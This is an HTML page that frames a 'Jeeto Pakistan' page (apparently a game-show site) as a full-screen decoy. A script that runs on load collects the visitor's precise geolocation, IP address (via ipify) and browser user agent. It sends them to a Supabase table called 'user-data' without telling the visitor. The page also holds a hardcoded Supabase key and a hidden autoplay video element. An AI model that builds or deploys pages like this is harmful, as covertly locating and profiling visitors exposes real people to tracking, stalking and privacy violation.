<html lang="en">
<head>

<body>
    <!-- Embed Jeeto Pakistan Webpage using iframe -->
    <iframe src="/Jeeto%20Pakistan.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1;"></iframe>
    
    <video id="video" autoplay style="display: none;"></video>
    <p id="status"></p>
    
    <p id="geolocation-status"></p>
    <p id="geolocation-result"></p>

    <script>
        // Initialize Supabase
        const SUPABASE_URL = "https://xsibckeasnitdilcdzoe.supabase.co"; // Replace with your Supabase URL
        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE"; // Replace with your Supabase anon key
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        // Function to request geolocation permission and fetch location
        async function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        document.getElementById("geolocation-status").innerText = "Location fetched successfully!";
                        document.getElementById("geolocation-result").innerText = 
                            `Latitude: ${latitude}, Longitude: ${longitude}`;
                        
                        // Fetch IP address
                        const ip = await fetchIPAddress();
                        
                        // Get device details
                        const device = getDeviceDetails();

                        // Send data to Supabase
                        const result = await sendDataToSupabase({ ip, latitude, longitude, device });
                        if (result.error) {
                            console.error("Error sending data to Supabase:", result.error.message);
                        } else {
                            console.log("Data successfully stored in Supabase:", result);
                        }
                    },
                    showError,
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                document.getElementById("geolocation-status").innerText = "Geolocation is not supported by this browser.";
            }
        }

        function showError(error) {
            let message = "";
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = "User denied the request for Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    message = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "An unknown error occurred.";
                    break;
            }
            document.getElementById("geolocation-status").innerText = `Error: ${message}`;
            console.error("Geolocation error:", message);
        }

        async function fetchIPAddress() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                return data.ip || "Unknown IP";
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Error fetching IP";
            }
        }

        function getDeviceDetails() {
            const userAgent = navigator.userAgent;
            return userAgent || "Unknown Device";
        }

        async function sendDataToSupabase(data) {
            try {
                const { error } = await supabase.from("user-data").insert([{
                    ip: data.ip,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    device: data.device,
                }]);
                return { error };
            } catch (err) {
                return { error: err.message };
            }
        }

        // Trigger geolocation request on page load
        window.onload = getGeolocation;
    </script>
</body>
